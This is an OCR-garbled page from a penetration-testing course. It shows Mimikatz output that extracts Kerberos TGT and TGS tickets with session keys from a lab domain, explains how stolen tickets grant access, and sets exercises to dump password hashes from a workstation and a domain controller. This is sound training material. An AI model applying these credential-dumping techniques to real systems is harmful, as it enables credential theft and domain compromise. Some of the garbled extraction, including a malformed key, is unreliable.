![](bbox=[0.13, 0.034, 0.26, 0.069])

Group 0 – **Ticket Granting Service**

```
```text
[00000000]
[00000001]
[00000002]
```
```

```
```text
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): cifs ; dc01 ; @ CORP.COM
Target Name (02): cifs ; dc01 ; @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM
Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
Session Key: 0x00000012 - aes256_hmac
d062a1bc89c09544a7130652f4d4bae4c04833c3324aa2e1b1051816a7090a0718
Ticket: 0x00000012 - aes256_hmac ; kvno = 3
```
```

Group 1 – Cli ent Ticket ?

Group 2 – **Ticket Granting Ticket**

```
```text
[00000000]
[00000001]
[00000002]
```
```

```
```text
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Target Name (→): @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM ($$Delegation Ticket$$)
Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwa
Session Key: 0x00000012 - aes256_hmac
3b0a49af17a1ada1dacf2e3b8964ad397d80270b71l8cc567da4d4b2b6dc90d
Ticket: 0x00000012 - aes256_hmac ; kvno = 2

[00000001]
Start/End/MaxRenew: 09/02/2018 14.41.47; 10/02/2018 00.41.47; 16/02/2018 14.41.47
Service Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Target Name (02): krbtgt ; CORP.COM ; @ CORP.COM
Client Name (01): Offsec ; @ CORP.COM ( CORP.COM )
Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forward
Session Key: 0x00000012 - aes256_hmac
8f6e96a7067a86d94af4e9f46e0e2abd067422fe7b1588db37c199f56e91a749c
Ticket: 0x00000012 - aes256_hmac ; kvno = 2
```
```

Listing 690 – Extracting Kerberos tickets with mimikatz

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.

In addition to these functions, Mimikatz can also export tickets to the hard drive and import tickets into LSASS, which we will explore later. Mimikatz can even extract information related to authentication performed through smart card and PIN, making this tool a real cached credential "Swiss Army knife"!

# 21.3.3.1 Exercises

+   1. Use Mimikatz to dump all password hashes from the student VM.

+   2. Log in to the domain controller as the Jeff\_Admin account through Remote Desktop and use Mimikatz to dump all password hashes from the server.